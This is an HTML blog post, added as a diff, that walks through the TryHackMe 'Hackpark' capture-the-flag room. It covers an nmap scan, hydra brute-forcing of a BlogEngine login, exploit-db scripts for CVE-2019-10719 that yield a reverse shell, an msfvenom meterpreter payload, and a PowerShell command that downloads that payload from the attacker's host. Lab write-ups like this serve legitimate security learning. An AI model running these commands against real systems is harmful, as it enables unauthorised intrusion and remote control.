@@ -1,0 +1,331 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Back Again: THM Hackpark</title>
+<meta name="author" content="Lamprinos Chatziioannou" />
+<meta name="generator" content="Org Mode" />
+<link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap"rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap"rel="stylesheet"><link rel="stylesheet" href="/src/rougier.css" />
+    <link rel="icon" type="image/x-icon" href="/src/favicon.ico"><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<div id="org-div-home-and-up">
+ <a accesskey="h" href="./index.html"> UP </a>
+ |
+ <a accesskey="H" href="/index.html"> HOME </a>
+</div><div id="content" class="content">
+<h1 class="title">Back Again: THM Hackpark</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org76748ac">Recon</a>
+<ul>
+<li><a href="#orgf26fb8a">Visiting the WebServer</a></li>
+</ul>
+</li>
+<li><a href="#orga48e2db">Bruteforcing the website log in</a></li>
+<li><a href="#orgbd9108b">Exploiting BlogEngine</a></li>
+<li><a href="#orgef35b50">PrivEsc</a>
+<ul>
+<li><a href="#orge481b9d">Meterpreter</a></li>
+</ul>
+</li>
+<li><a href="#orge67a61a">Conclusion</a></li>
+</ul>
+</div>
+</div>
+<p>
+After taking a short break from CTFs, trying to keep my <b>tryhackme</b>
+active streak &#x2026; active and losing quite a lot of time to finding and
+fixing stuff (unfortunately not only in software), it is time for yet
+another CTF. If I am not mistaken this is listed as an easy one, so
+let&rsquo;s dive right in.
+</p>
+
+<p>
+After using the good ol trick of modifying <code>/etc/hosts</code> and <code>.bashrc</code> for
+easier handling of the remote machine&rsquo;s address:
+</p>
+
+<div id="outline-container-org76748ac" class="outline-2">
+<h2 id="org76748ac"><a href="#org76748ac">Recon</a></h2>
+<div class="outline-text-2" id="text-org76748ac">
+<p>
+Our initial port scan only shows 2 open ports:
+</p>
+<ul class="org-ul">
+<li class="off"><code>[&#xa0;]</code> 80: a web server</li>
+<li class="off"><code>[&#xa0;]</code> 3389: Microsoft SChannel TLS (which the most prominent google
+results suggest may be an RDP entry point)</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-bash" id="org9b9da72">nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
+</pre>
+</div>
+
+<p>
+After checking on the results that the full nmap scan returned (while
+the bruteforce performed ahead was running), another open port was
+revealed:
+</p>
+<ul class="org-ul">
+<li class="off"><code>[&#xa0;]</code> 5985: wsman</li>
+</ul>
+</div>
+
+<div id="outline-container-orgf26fb8a" class="outline-3">
+<h3 id="orgf26fb8a"><a href="#orgf26fb8a">Visiting the WebServer</a></h3>
+<div class="outline-text-3" id="text-orgf26fb8a">
+<p>
+The website is powered by <code>BlogEngine</code>, with numerous exploits readily
+available for certain versions of it in exploitdb.
+</p>
+
+<p>
+<code>robots.txt</code> has some nice directories:
+</p>
+<pre class="example" id="orgbf82b7f">
+User-agent: *
+Disallow: /Account/*.*
+Disallow: /search
+Disallow: /search.aspx
+Disallow: /error404.aspx
+Disallow: /archive
+Disallow: /archive.aspx
+</pre>
+
+<p>
+We have a contact form, so a XSS vulnerability could (maybe) be used
+</p>
+
+<div id="orgd21119e" class="figure">
+<p><img src="images/Recon/20231215_000936_screenshot.png" alt="20231215_000936_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 1: </span>Contact form</p>
+</div>
+
+<p>
+We also have a log in form:
+</p>
+
+<div id="orgff36da2" class="figure">
+<p><img src="images/Recon/20231215_001129_screenshot.png" alt="20231215_001129_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 2: </span>Log in form</p>
+</div>
+
+<p>
+The room&rsquo;s author (after dealing with the first &ldquo;flag&rdquo;), suggests
+bruteforcing, so even though it is not my first option, this is what I
+am looking at.
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orga48e2db" class="outline-2">
+<h2 id="orga48e2db"><a href="#orga48e2db">Bruteforcing the website log in</a></h2>
+<div class="outline-text-2" id="text-orga48e2db">
+<p>
+After redirecting my web traffic to burp, so that I can better see how
+my post requests are structured, it becomes apparrent that there is a
+set of parameters (other than just username and password) I need to
+set:
+</p>
+
+<pre class="example" id="orgbdc3beb">
+__VIEWSTATE=UnGFJ1jVBCvPEJB6QrtoKjw76I1fof5nb5%2Fmi95M3Edq9I%2FyqWIy2X2%2FvU7Ag6VZLp%2BYaqmf9yb4caypLwuCdNI3qKUNzyfXiyfNXj5EpuJ0v1Bx%2BnUjl%2FYd9ar9Tb8f3nFwQNVJA6mndKa3dsYvFzu1Bexhhxrqz1chJpeI3L3asy8n&amp;__EVENTVALIDATION=EAe%2B9Chaa4KVFKEQmsprctI7ZIULtNtcD5gfs0zaO0eCbHDdIzjkiO%2BL%2F06nRadcC4cNF5UU3h7kFR%2BmxGwEyb8LufjLU1PJZ9wMrll%2FbVKtVQVrulxrJ3RbExWazKFa8xYTlGU2rrsOcv46foitShidjkUpCxSflIsV3F5p6KrgzjkM&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
+</pre>
+
+<p>
+Adding to these the knowledge that the login post request had this
+path <code>/Account/login.aspx</code> and failed login attempts had <code>Login failed</code>:,
+I structured the following hydra command:
+</p>
+<div class="org-src-container">
+<pre class="src src-bash" id="orgf3cbba7">hydra -l admin -P /usr/share/wordlists/rockyou.txt hackpark.thm http-post-form <span class="org-string">"/Account/login.aspx:__VIEWSTATE=UnGFJ1jVBCvPEJB6QrtoKjw76I1fof5nb5%2Fmi95M3Edq9I%2FyqWIy2X2%2FvU7Ag6VZLp%2BYaqmf9yb4caypLwuCdNI3qKUNzyfXiyfNXj5EpuJ0v1Bx%2BnUjl%2FYd9ar9Tb8f3nFwQNVJA6mndKa3dsYvFzu1Bexhhxrqz1chJpeI3L3asy8n&amp;__EVENTVALIDATION=EAe%2B9Chaa4KVFKEQmsprctI7ZIULtNtcD5gfs0zaO0eCbHDdIzjkiO%2BL%2F06nRadcC4cNF5UU3h7kFR%2BmxGwEyb8LufjLU1PJZ9wMrll%2FbVKtVQVrulxrJ3RbExWazKFa8xYTlGU2rrsOcv46foitShidjkUpCxSflIsV3F5p6KrgzjkM&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"</span> 
+</pre>
+</div>
+
+<p>
+After waiting for some time, it gave us the password.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgbd9108b" class="outline-2">
+<h2 id="orgbd9108b"><a href="#orgbd9108b">Exploiting BlogEngine</a></h2>
+<div class="outline-text-2" id="text-orgbd9108b">
+<p>
+Seeing that BlogEngine had some exploits available, I immediately
+searched for the currently running version, (available in the <code>about</code>
+pane). 
+</p>
+
+
+<div id="org018ee63" class="figure">
+<p><img src="images/Exploiting_BlogEngine/20231215_003106_screenshot.png" alt="20231215_003106_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 3: </span>Blog Engine Version</p>
+</div>
+
+<p>
+Heading back to <code>searchsploit</code>, we see that there are two readily
+available python scripts for us to use (much better than the manual
+alternative :P ):
+</p>
+
+<pre class="example" id="org8389282">
+BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Direct | aspx/webapps/47010.py
+BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' D | aspx/webapps/47011.py
+</pre>
+
+<p>
+Now, after checking with (-x), we see that both of them are by the
+same author and essentially have a similar behavior. I decided to go
+with the first one.
+</p>
+
+<pre class="example" id="org1609b56">
+Exploit for CVE-2019-10719
+
+CVE Identified by: Aaron Bishop
+Exploit written by: Aaron Bishop
+
+Upload and trigger a reverse shell
+
+python exploit.py -t 192.168.10.9 -l 192.168.10.10:1337
+
+Open a listener to capture the reverse shell - Metasploit or netcat
+
+nc -nlvp 1337
+</pre>
+
+<p>
+This, taken from the exploit file (obviously), served as the basis for
+the following command
+</p>
+<div class="org-src-container">
+<pre class="src src-bash" id="org1c8f75f">searchsploit -m 47010 <span class="org-comment-delimiter"># </span><span class="org-comment">this might be just the most beautiful option in searchsploit, which I had *totally* missed for quite a long time</span>
+python 47010.py -t hackpark.thm -l 10.10.93.209:6969 -u admin -p 1qaz2wsx
+</pre>
+</div>
+
+<p>
+This, strangely did not work, so before tinkering around any longer, I
+ran the same command with 47011 (which required me to comment out just
+one line in the python script as well). At this point, 47011 gave us a
+nice reverse shell.
+</p>
+
+
+
+<div id="org499b284" class="figure">
+<p><img src="images/Exploiting_BlogEngine/20231215_004446_screenshot.png" alt="20231215_004446_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 4: </span>Initial Foothold</p>
+</div>
+
+<p>
+Seeing the privileges granted to our user, even the privilege
+escalation path is already known, so after uploading winpeas or
+getting a meterpreter shell, there is no need for manual priv esc.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgef35b50" class="outline-2">
+<h2 id="orgef35b50"><a href="#orgef35b50">PrivEsc</a></h2>
+<div class="outline-text-2" id="text-orgef35b50">
+<p>
+This section could be called &ldquo;getting the flags&rdquo;, because I do not
+believe that I would go 
+</p>
+</div>
+
+<div id="outline-container-orge481b9d" class="outline-3">
+<h3 id="orge481b9d"><a href="#orge481b9d">Meterpreter</a></h3>
+<div class="outline-text-3" id="text-orge481b9d">
+<p>
+First things first, generating and uploading the payload to the target
+host:
+</p>
+<pre class="example" id="org0e9e866">
+root@ip-10-10-93-209:~# msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.10.93.209 LPORT=6970
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe
+root@ip-10-10-93-209:~# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</pre>
+
+<p>
+Now, getting the file to the target system was <b>way</b> harder than it
+needed to be. Initially, I thought that it would be just a bit more
+difficult than it is on Linux. No matter what I tried, however, I
+could not see that long awaited line in my python server, showing that
+the file had been requested&#x2026;
+</p>
+
+<p>
+Sometime, I managed to get it to do the request, but a &rsquo;Bad Request
+Syntax&rsquo; prevented me from getting too excited - if you find yourself
+in that position make sure that you are smarter than me: pressing
+https instead of http by habit.
+</p>
+
+<pre class="example" id="org3a37302">
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.93.209:8000/shell.exe' -OutFile 'c:\Windows\Temp\shell.exe'"
+</pre>
+
+
+<div id="org5ff9c58" class="figure">
+<p><img src="images/PrivEsc/20231215_012431_screenshot.png" alt="20231215_012431_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 5: </span>Meterpreter</p>
+</div>
+
+
+<p>
+(After completing this section I realized I did not include how the
+handler was set up, but it is trivial, just <code>use</code> the
+exploit/multi/handle - shown above - and complete the options)
+</p>
+
+<p>
+After completing the tedious flags, just a simple <code>cat</code> gives us the
+flag on <code>jeff</code>&rsquo;s and <code>Administrator</code>&rsquo;s desktops respectively.
+</p>
+
+<p>
+Winpeas is not necessary since we have a full-fledged meterpreter
+session. Maybe next time.
+</p>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-orge67a61a" class="outline-2">
+<h2 id="orge67a61a"><a href="#orge67a61a">Conclusion</a></h2>
+<div class="outline-text-2" id="text-orge67a61a">
+<p>
+I will focus on getting some more experience with windows, at least on
+a theoretical level, and populating my notes better, because I think
+it is quite sad to see how much more difficult exploiting windows feels.
+</p>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id="R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script><p class="date footer"> Originally created on 2023-12-14 Thu 23:58 </p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.</p>
+</div>
+</body>
+</html>
